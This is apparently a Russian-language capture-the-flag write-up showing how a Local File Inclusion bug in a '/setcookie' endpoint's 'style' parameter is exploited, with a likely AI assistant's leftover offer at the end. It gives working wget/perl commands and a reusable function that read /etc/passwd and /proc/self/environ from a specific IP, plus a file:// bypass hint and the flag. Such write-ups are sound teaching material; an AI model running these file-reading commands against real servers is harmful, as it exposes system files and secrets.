
# Эксплуатация LFI в параметре `style`

## Суть уязвимости
Эндпоинт `/setcookie` принимает параметр `style` и без фильтрации подставляет его как путь к файлу. Содержимое этого файла сервер вставляет в HTML внутри тега `<style>…</style>`.  
Это приводит к уязвимости **Local File Inclusion (LFI)** и позволяет читать произвольные файлы на сервере.

---

## Ход эксплуатации

### 1. Проверка уязвимости
Отправка запроса с `style=/etc/hosts`:

```bash
tok=$(wget -qS --save-headers -O- --post-data "style=/etc/hosts" http://158.160.39.5:13355/setcookie 2>&1 \
      | sed -n 's/^  [sS]et-[cC]ookie: cookie=\([^;]*\);.*/\1/p' | tail -n 1)

wget -qO- --header "Cookie: cookie=$tok" http://158.160.39.5:13355/ \
  | perl -0777 -ne 'my @m = ($_ =~ m{<style[^>]*>(.*?)</style>}sig); print $m[-1] if @m;'
````

В ответе в `<style>…</style>` появилось содержимое `/etc/hosts`. Уязвимость подтверждена.

---

### 2. Автоматизация чтения файлов

Создана удобная функция `get_style`:

```bash
get_style() {
  path="$1"
  tok=$(wget -qS --save-headers -O- --post-data "style=$path" http://158.160.39.5:13355/setcookie 2>&1 \
        | sed -n 's/^  [sS]et-[cC]ookie: cookie=\([^;]*\);.*/\1/p' | tail -n 1)
  wget -qO- --header "Cookie: cookie=$tok" http://158.160.39.5:13355/ \
    | perl -0777 -ne 'my @m = ($_ =~ m{<style[^>]*>(.*?)</style>}sig); print $m[-1] if @m;'
}
```

Теперь можно читать любой файл так:

```bash
get_style /etc/passwd
```

---

### 3. Получение переменных окружения

Файл `/proc/self/environ` хранит переменные окружения процесса.
Он разделён нулевыми байтами, поэтому они заменяются на переносы строк:

```bash
get_style /proc/self/environ | tr '\0' '\n'
```

Ключевые данные:

```
PWD=/app
HOME=/root
CTF_FLAG=YANDEX_CsS_s0_sTyl1sh_So_s1Mpl3
```

---

### 4. Контекст процесса

Из `/proc/self/cmdline`:

```
python3
app.py
```

---

## Итоги

* **Флаг**: `YANDEX_CsS_s0_sTyl1sh_So_s1Mpl3`
* **Процесс**: `python3 app.py`
* **Рабочая директория**: `/app`
* Уязвимость эксплуатируется напрямую через LFI, без подбора JWT-секрета.

---

### Подсказка

Если прямая подстановка пути не работает, иногда помогает форма:

```
style=file:///etc/hosts
```

```

Хочешь, я дополню этот `README.md` блоком про рекомендации по защите от LFI (чтобы выглядело как полноценный разбор с mitigation)?
```
